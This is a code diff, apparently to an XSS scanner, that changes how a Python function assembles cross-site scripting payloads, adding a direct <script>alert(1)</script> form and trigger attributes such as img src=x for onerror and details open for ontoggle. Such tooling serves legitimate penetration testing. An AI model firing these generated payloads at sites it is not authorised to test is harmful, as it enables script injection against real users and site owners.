@@ -153,8 +153,37 @@ def genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends,
                                     breaker = ''
                                     if badTag:
                                         breaker = '</' + r(badTag) + '>'
-                                    vector = breaker + '<' + r(tag) + filling + r(
-                                        eventHandler) + eFilling + '=' + eFilling + function + lFilling + end + bait
+                                    
+                                    # script标签特殊处理：直接包含JavaScript代码（仅在精简模式中）
+                                    if tag == 'script' and eventHandler == 'direct':
+                                        # <script>alert(1)</script>
+                                        vector = breaker + '<' + r(tag) + '>' + function + '</' + r(tag) + '>' + bait
+                                        vectors.append(vector)
+                                        continue
+                                    
+                                    # 为不同标签添加必要的触发属性（精简模式）
+                                    trigger_attr = ''
+                                    if tag == 'img':
+                                        trigger_attr = filling + 'src=x'  # img需要src属性触发onerror
+                                    elif tag == 'svg':
+                                        trigger_attr = ''  # svg的onload可以直接触发
+                                    elif tag == 'details':
+                                        trigger_attr = filling + 'open'  # details需要open属性触发ontoggle
+                                    elif tag == 'body':
+                                        trigger_attr = ''  # body标签的事件可以直接触发
+                                    
+                                    # 修复：= 号后面不应该有额外的空格
+                                    # 兼容完整模式：使用原始格式（eFilling会在=两边）
+                                    # 兼容精简模式：使用改进的格式（trigger_attr + eventHandler）
+                                    if trigger_attr or tag in ('body', 'svg'):
+                                        # 精简模式格式：<tag trigger_attr filling eventHandler eFilling = function lFilling end bait
+                                        vector = breaker + '<' + r(tag) + trigger_attr + filling + r(
+                                            eventHandler) + eFilling + '=' + function + lFilling + end + bait
+                                    else:
+                                        # 完整模式格式（向后兼容）：<tag filling eventHandler eFilling = eFilling function lFilling end bait
+                                        vector = breaker + '<' + r(tag) + filling + r(
+                                            eventHandler) + eFilling + '=' + eFilling + function + lFilling + end + bait
+                                    
                                     vectors.append(vector)
     return vectors
 
